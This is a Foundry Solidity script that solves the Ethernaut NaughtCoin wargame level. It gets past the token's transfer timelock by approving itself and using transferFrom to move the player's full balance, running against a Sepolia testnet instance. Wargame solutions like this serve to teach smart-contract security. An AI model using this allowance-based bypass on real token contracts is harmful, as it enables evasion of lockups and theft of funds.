// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/NaughtCoin.sol";

/*
    Solution script for the Ethernaut Level 9: NaughtCoin

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in NaughtCoinScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/NaughtCoin.s.sol:NaughtCoinScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/NaughtCoin.s.sol/11155111
*/

contract NaughtCoinScript is Script {
    // replace instance with your level1 instance adddress
    address payable instance = payable(0x32f3e3b78Cd285f51199d278929f74F304212643);
    NaughtCoin level15 = NaughtCoin(instance);

    function run() external {
        vm.startBroadcast();

        uint256 playerBalance = level15.balanceOf(msg.sender);
        // console.log("Current player token balance is: ", playerBalance);

        level15.approve(msg.sender, playerBalance);
        level15.transferFrom(msg.sender, address(level15), playerBalance);

        // console.log("New player token balance is: ", level15.balanceOf(msg.sender));
        require(level15.balanceOf(msg.sender) == 0, "player still has tokens");

        vm.stopBroadcast();
    }
}